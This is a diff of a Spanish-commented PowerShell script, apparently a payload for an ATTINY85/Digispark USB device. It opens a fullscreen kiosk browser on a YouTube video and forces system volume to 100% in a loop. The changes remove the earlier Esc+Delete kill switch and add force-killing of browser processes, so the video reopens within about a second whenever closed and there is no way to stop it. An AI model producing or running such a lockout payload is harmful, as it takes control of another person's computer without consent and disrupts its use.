@@ -1,38 +1,18 @@
 <#
-  run.ps1 - video de gatitos a pantalla completa + reopen rápido
-  Corregido Error 153
+  run.ps1 - gatitos a pantalla completa + reopen instantáneo
+  Sin iframe (soluciona Error 153)
 #>
 
 $ErrorActionPreference = 'SilentlyContinue'
 $ProgressPreference    = 'SilentlyContinue'
 try { [Net.ServicePointManager]::SecurityProtocol = 3072 } catch {}
 
-$BASE   = 'https://raw.githubusercontent.com/IFROS-GAm/ATTINY85/main'
-$cfgUrl = "$BASE/config.txt"
+# Video de gatitos
+$videoId = 'ik-nB-VKuEM'
+$titulo  = 'YouTube'
+$perfil  = Join-Path $env:TEMP 'venice_kiosk'
 
-# ---------------- config ----------------
-$cfg = @{ mode='youtube'; video_id='ik-nB-VKuEM'; media=''; slide='7';
-          volumen='100'; watchdog='1'; titulo='RickDigispark' }
-try {
-  $txt = (New-Object Net.WebClient).DownloadString($cfgUrl)
-  foreach ($ln in ($txt -split "`r?`n")) {
-    $l = $ln.Trim()
-    if ($l -eq '' -or $l.StartsWith('#')) { continue }
-    $i = $l.IndexOf('='); if ($i -lt 1) { continue }
-    $k = $l.Substring(0,$i).Trim().ToLower()
-    $v = $l.Substring($i+1).Trim()
-    if ($cfg.ContainsKey($k)) { $cfg[$k] = $v }
-  }
-} catch {}
-
-# Forzar el video de gatitos (por si el config falla)
-$cfg.video_id = 'ik-nB-VKuEM'
-$cfg.mode     = 'youtube'
-
-$titulo = if ($cfg.titulo) { $cfg.titulo } else { 'RickDigispark' }
-$perfil = Join-Path $env:TEMP 'venice_kiosk'
-
-# ---------------- volumen ----------------
+# ---------------- volumen al 100% ----------------
 Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
@@ -63,62 +43,6 @@ public static class Vol {
   public static void Set(float v) { var a = V(); a.SetMasterVolumeLevelScalar(v, IntPtr.Zero); a.SetMute(0, IntPtr.Zero); }
 }
 '@
-$volTarget = [double]$cfg.volumen / 100.0
-
-# ---------------- pagina ----------------
-function New-Page {
-  $items = @($cfg.media -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
-  $esVideo = ($items.Count -eq 1) -and ($items[0] -match '\.(mp4|webm|ogv|mov|m4v)(\?|$)')
-
-  if ($cfg.mode -eq 'youtube') {
-    $id = $cfg.video_id.Trim()
-    # === CORRECCIÓN Error 153 (dominio normal + menos parámetros restrictivos) ===
-    $u  = "https://www.youtube.com/embed/$id?autoplay=1&loop=1&playlist=$id&controls=0&modestbranding=1&rel=0&fs=0"
-    $cuerpo = "<iframe id='m' src='$u' allow='autoplay; fullscreen' allowfullscreen></iframe>"
-  } elseif ($cfg.mode -eq 'page') {
-    $cuerpo = "<iframe id='m' src='$($items[0])' allow='autoplay; fullscreen' allowfullscreen></iframe>"
-  } elseif ($esVideo) {
-    $cuerpo = "<video id='m' src='$($items[0])' autoplay loop playsinline></video>"
-  } else {
-    $cuerpo = "<img id='m' src='$($items[0])'>"
-  }
-  $lista = ($items | ForEach-Object { "'$_'" }) -join ','
-
-  $html = @"
-<!doctype html><html><head><meta charset="utf-8"><title>$titulo</title>
-<style>
-  html,body{margin:0;padding:0;width:100%;height:100%;background:#000;overflow:hidden}
-  *{cursor:none !important}
-  #m{position:fixed;left:0;top:0;width:100vw;height:100vh;object-fit:contain;border:0;background:#000}
-  iframe#m{pointer-events:none}
-</style></head><body>
-$cuerpo
-<script>
-  var SLIDE = $($cfg.slide) * 1000, items = [$lista], m = document.getElementById('m');
-  if (m && m.tagName === 'VIDEO') { m.volume = 1; m.play().catch(function(){}); }
-  if (m && m.tagName === 'IMG' && items.length > 1) {
-    var i = 0;
-    setInterval(function(){ i = (i+1) % items.length; m.src = items[i]; }, SLIDE);
-  }
-  var tEsc = 0, tDel = 0, hecho = false;
-  function matar(){
-    if (hecho) return;
-    hecho = true;
-    document.title = 'STOP';
-  }
-  window.addEventListener('keydown', function(e){
-    var t = Date.now(), k = e.key;
-    if (k === 'Escape' || k === 'Esc') { tEsc = t; if (t - tDel < 700) matar(); }
-    if (k === 'Delete' || k === 'Del') { tDel = t; if (t - tEsc < 700) matar(); }
-    if (k === 'Escape' || k === 'Delete') e.preventDefault();
-  });
-  window.focus();
-</script></body></html>
-"@
-  $ruta = Join-Path $env:TEMP 'venice_kiosk.html'
-  [IO.File]::WriteAllText($ruta, $html, [Text.Encoding]::UTF8)
-  return $ruta
-}
 
 # ---------------- navegador ----------------
 function Get-Nav {
@@ -132,13 +56,13 @@ function Get-Nav {
   foreach ($p in $c) { if (Test-Path $p) { return $p } }
   return $null
 }
+
 $nav = Get-Nav
 if (-not $nav) { exit }
 $proc = [IO.Path]::GetFileNameWithoutExtension($nav)
 
-$pagina = New-Page
-$url = 'file:///' + ($pagina -replace '\\','/')
-if ($cfg.mode -eq 'direct') { $url = $cfg.media }
+# URL directa de YouTube (sin embed)
+$url = "https://www.youtube.com/watch?v=$videoId&autoplay=1"
 
 $flags = "--kiosk `"$url`" --user-data-dir=`"$perfil`" --no-first-run " +
          "--no-default-browser-check --disable-session-crashed-bubble --noerrdialogs " +
@@ -148,35 +72,37 @@ if ($nav -match 'msedge') { $flags += ' --edge-kiosk-type=fullscreen' }
 
 $script:pidNav = 0
 function Lanzar {
+  # Matar cualquier instancia anterior del perfil para que sea limpio
+  Get-Process -Name $proc -ErrorAction SilentlyContinue | Where-Object {
+    try { $_.MainWindowTitle -like "*YouTube*" -or $_.MainWindowTitle -eq "" } catch { $false }
+  } | Stop-Process -Force -ErrorAction SilentlyContinue
+
   $p = Start-Process -FilePath $nav -ArgumentList $flags -PassThru
   if ($p) { $script:pidNav = $p.Id }
 }
 
+# Primera apertura
 Lanzar
-Start-Sleep -Seconds 3
+Start-Sleep -Milliseconds 1200
 
-# ---------------- bucle rápido ----------------
+# ---------------- bucle ultra rápido ----------------
 while ($true) {
-  [Vol]::Set($volTarget)
+  [Vol]::Set(1.0)   # volumen 100% siempre
 
-  $ventanas = Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowTitle }
-
-  if ($ventanas | Where-Object { $_.MainWindowTitle -like '*STOP*' }) {
-    if ($script:pidNav -and (Get-Process -Id $script:pidNav -ErrorAction SilentlyContinue)) {
-      taskkill /PID $script:pidNav /T /F | Out-Null
-    } else {
-      Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
-    }
-    break
-  }
-
-  # Reopen casi al instante
-  if ($cfg.watchdog -eq '1') {
-    if (-not ($ventanas | Where-Object { $_.MainWindowTitle -like "*$titulo*" })) {
-      Lanzar
-      Start-Sleep -Milliseconds 600
+  $existe = $false
+  $ventanas = Get-Process -Name $proc -ErrorAction SilentlyContinue
+  foreach ($v in $ventanas) {
+    if ($v.MainWindowTitle -like "*YouTube*" -or $v.MainWindowTitle -like "*gatit*" -or $v.Id -eq $script:pidNav) {
+      $existe = $true
+      break
     }
   }
 
-  Start-Sleep -Milliseconds 250
+  # Si no hay ventana de YouTube → reabrir inmediatamente
+  if (-not $existe) {
+    Lanzar
+    Start-Sleep -Milliseconds 800
+  }
+
+  Start-Sleep -Milliseconds 150
 }
